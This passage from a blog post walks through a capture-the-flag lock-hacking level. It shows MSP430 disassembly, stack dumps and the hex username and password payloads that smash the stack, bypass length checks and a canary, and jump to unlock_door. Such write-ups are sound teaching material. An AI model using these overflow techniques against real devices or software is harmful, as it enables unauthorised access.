<p>However, it still persists in the stack (where it to was copied to using <code>strcpy</code>) and therefore enables us to use the same trick from before. Entering <code>0x6161616161616161616161616161616160447f</code> will take us to the next level.</p>

<h2>Level 9: Santa Cruz</h2>

<p>In this level the HSM 1 is used instead of HSM 2. Thus, the code to unlock the deadbolt resides inside the LockIT Pro and we need to find a way to make the program reach it. A viable way is to smash the stack and overwrite the return address with that of <code>unlock_door</code>. However, this is a bit more complicated than previous levels. Below is the code of the infamous <code>login</code> subroutine broken into several parts and accompanied by my explanations.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>4550 &lt;login&gt;
</span><span class='line'>4550:  0b12           push  r11
</span><span class='line'>4552:  0412           push  r4
</span><span class='line'>4554:  0441           mov   sp, r4
</span><span class='line'>4556:  2452           add   #0x4, r4
</span><span class='line'>4558:  3150 d8ff      add   #0xffd8, sp
</span><span class='line'>455c:  c443 faff      mov.b #0x0, -0x6(r4)
</span><span class='line'>4560:  f442 e7ff      mov.b #0x8, -0x19(r4)
</span><span class='line'>4564:  f440 1000 e8ff mov.b #0x10, -0x18(r4)
</span><span class='line'>456a:  3f40 8444      mov   #0x4484 "Authentication now requires a username and password.", r15
</span><span class='line'>456e:  b012 2847      call  #0x4728 &lt;puts&gt;
</span><span class='line'>4572:  3f40 b944      mov   #0x44b9 "Remember: both are between 8 and 16 characters.", r15
</span><span class='line'>4576:  b012 2847      call  #0x4728 &lt;puts&gt;
</span><span class='line'>457a:  3f40 e944      mov   #0x44e9 "Please enter your username:", r15
</span><span class='line'>457e:  b012 2847      call  #0x4728 &lt;puts&gt;
</span><span class='line'>4582:  3e40 6300      mov   #0x63, r14
</span><span class='line'>4586:  3f40 0424      mov   #0x2404, r15
</span><span class='line'>458a:  b012 1847      call  #0x4718 &lt;getsn&gt;
</span><span class='line'>458e:  3f40 0424      mov   #0x2404, r15
</span><span class='line'>4592:  b012 2847      call  #0x4728 &lt;puts&gt;
</span><span class='line'>4596:  3e40 0424      mov   #0x2404, r14
</span><span class='line'>459a:  0f44           mov   r4, r15
</span><span class='line'>459c:  3f50 d6ff      add   #0xffd6, r15
</span><span class='line'>45a0:  b012 5447      call  #0x4754 &lt;strcpy&gt;
</span><span class='line'>45a4:  3f40 0545      mov   #0x4505 "Please enter your password:", r15
</span><span class='line'>45a8:  b012 2847      call  #0x4728 &lt;puts&gt;
</span><span class='line'>45ac:  3e40 6300      mov   #0x63, r14
</span><span class='line'>45b0:  3f40 0424      mov   #0x2404, r15
</span><span class='line'>45b4:  b012 1847      call  #0x4718 &lt;getsn&gt;
</span><span class='line'>45b8:  3f40 0424      mov   #0x2404, r15
</span><span class='line'>45bc:  b012 2847      call  #0x4728 &lt;puts&gt;
</span><span class='line'>45c0:  0b44           mov   r4, r11
</span><span class='line'>45c2:  3b50 e9ff      add   #0xffe9, r11
</span><span class='line'>45c6:  3e40 0424      mov   #0x2404, r14
</span><span class='line'>45ca:  0f4b           mov   r11, r15
</span><span class='line'>45cc:  b012 5447      call  #0x4754 &lt;strcpy&gt;</span></code></pre></td></tr></table></div></figure>


<p>At this stage, assuming we entered <code>doge</code> and <code>idosch1234</code> as username and password, the stack will look like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>4390:   0000 d846 0300 4c47 0000 0a00 0000 d045   ...F..LG.......E
</span><span class='line'>43a0:   0000 646f 6765 0000 0000 0000 0000 0000   ..doge..........
</span><span class='line'>43b0:   0000 0008 1069 646f 7363 6831 3233 3400   .....idosch1234.
</span><span class='line'>43c0:   0000 0000 0000 0000 0000 0000 4044 0000   ............@D..</span></code></pre></td></tr></table></div></figure>


<p>with <code>sp</code> pointing to <code>0x43a0</code>. It&rsquo;s important to take notice here of several parameters:</p>

<ol>
<li>Username and password starting at addresses <code>0x43a2</code> and <code>0x43b5</code>, respectively.</li>
<li>Return address at <code>0x43cc</code>.</li>
<li>Values <code>0x8</code> and <code>0x10</code> at <code>0x43b3</code> and <code>0x43b4</code>, respectively. These values will be later used in order to make sure that the password&rsquo;s length is indeed between 8 to 16 chars (inclusive).</li>
</ol>


<p>The password&rsquo;s length is computed and stored in <code>r11</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>45d0:  0f4b           mov   r11, r15
</span><span class='line'>45d2:  0e44           mov   r4, r14
</span><span class='line'>45d4:  3e50 e8ff      add   #0xffe8, r14
</span><span class='line'>45d8:  1e53           inc   r14
</span><span class='line'>45da:  ce93 0000      tst.b 0x0(r14)
</span><span class='line'>45de:  fc23           jnz   #0x45d8 &lt;login+0x88&gt;
</span><span class='line'>45e0:  0b4e           mov   r14, r11
</span><span class='line'>45e2:  0b8f           sub   r15, r11</span></code></pre></td></tr></table></div></figure>


<p>The password&rsquo;s length is checked to be less than 16 chars using the value stored at <code>0x43b4</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>45e4:  5f44 e8ff      mov.b -0x18(r4), r15
</span><span class='line'>45e8:  8f11           sxt   r15
</span><span class='line'>45ea:  0b9f           cmp   r15, r11
</span><span class='line'>45ec:  0628           jnc   #0x45fa &lt;login+0xaa&gt;
</span><span class='line'>45ee:  1f42 0024      mov   &0x2400, r15
</span><span class='line'>45f2:  b012 2847      call  #0x4728 &lt;puts&gt;
</span><span class='line'>45f6:  3040 4044      br    #0x4440 &lt;__stop_progExec__&gt;</span></code></pre></td></tr></table></div></figure>


<p>And now it&rsquo;s checked to be at least 8 chars long.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>45fa:  5f44 e7ff      mov.b -0x19(r4), r15
</span><span class='line'>45fe:  8f11           sxt   r15
</span><span class='line'>4600:  0b9f           cmp   r15, r11
</span><span class='line'>4602:  062c           jc    #0x4610 &lt;login+0xc0&gt;
</span><span class='line'>4604:  1f42 0224      mov   &0x2402, r15
</span><span class='line'>4608:  b012 2847      call  #0x4728 &lt;puts&gt;
</span><span class='line'>460c:  3040 4044      br    #0x4440 &lt;__stop_progExec__&gt;</span></code></pre></td></tr></table></div></figure>


<p>After passing both of these checks the password is now passed to the HSM 1 for validation (spoiler: it&rsquo;s not).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>4610:  c443 d4ff      mov.b #0x0, -0x2c(r4)
</span><span class='line'>4614:  3f40 d4ff      mov   #0xffd4, r15
</span><span class='line'>4618:  0f54           add   r4, r15
</span><span class='line'>461a:  0f12           push  r15
</span><span class='line'>461c:  0f44           mov   r4, r15
</span><span class='line'>461e:  3f50 e9ff      add   #0xffe9, r15
</span><span class='line'>4622:  0f12           push  r15
</span><span class='line'>4624:  3f50 edff      add   #0xffed, r15
</span><span class='line'>4628:  0f12           push  r15
</span><span class='line'>462a:  3012 7d00      push  #0x7d
</span><span class='line'>462e:  b012 c446      call  #0x46c4 &lt;INT&gt;
</span><span class='line'>4632:  3152           add   #0x8, sp
</span><span class='line'>4634:  c493 d4ff      tst.b -0x2c(r4)
</span><span class='line'>4638:  0524           jz    #0x4644 &lt;login+0xf4&gt;
</span><span class='line'>463a:  b012 4a44      call  #0x444a &lt;unlock_door&gt;
</span><span class='line'>463e:  3f40 2145      mov   #0x4521 "Access granted.", r15
</span><span class='line'>4642:  023c           jmp   #0x4648 &lt;login+0xf8&gt;
</span><span class='line'>4644:  3f40 3145      mov   #0x4531 "That password is not correct.", r15
</span><span class='line'>4648:  b012 2847      call  #0x4728 &lt;puts&gt;</span></code></pre></td></tr></table></div></figure>


<p>Although the password&rsquo;s length was already checked twice, another test is performed here: memory location <code>0x43c6</code> is checked to be <code>0x0</code> (very much like the &ldquo;canary&rdquo; in Johannesburg).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>464c:  c493 faff      tst.b -0x6(r4)
</span><span class='line'>4650:  0624           jz    #0x465e &lt;login+0x10e&gt;
</span><span class='line'>4652:  1f42 0024      mov   &0x2400, r15
</span><span class='line'>4656:  b012 2847      call  #0x4728 &lt;puts&gt;
</span><span class='line'>465a:  3040 4044      br    #0x4440 &lt;__stop_progExec__&gt;
</span><span class='line'>465e:  3150 2800      add   #0x28, sp
</span><span class='line'>4662:  3441           pop   r4
</span><span class='line'>4664:  3b41           pop   r11
</span><span class='line'>4666:  3041           ret</span></code></pre></td></tr></table></div></figure>


<p>After absorbing all these information it&rsquo;s pretty clear what to do. We begin by entering a username that will overwrite the password&rsquo;s length boundaries at <code>0x43a2</code> and <code>0x43b5</code> with more appropriate values such as <code>0x1</code> and <code>0xff</code>. We also use the username to change the return address at <code>0x43cc</code> to that of <code>unlock_door</code>. <code>0x616161616161616161616161616161616101ff61616161616161616161616161616161616161616161614a44</code> is a good choice. Next, we enter a password whose sole purpose is to overwrite <code>0x43c6</code> with <code>0x0</code>. Since the username already took care of the password&rsquo;s length we can enter a password longer than 16 chars. <code>0x616161616161616161616161616161616100</code> does the job.</p>

<p>In the next post I&rsquo;ll add my solutions to the next levels.</p>
]]></content>
  </entry>
  
</feed>
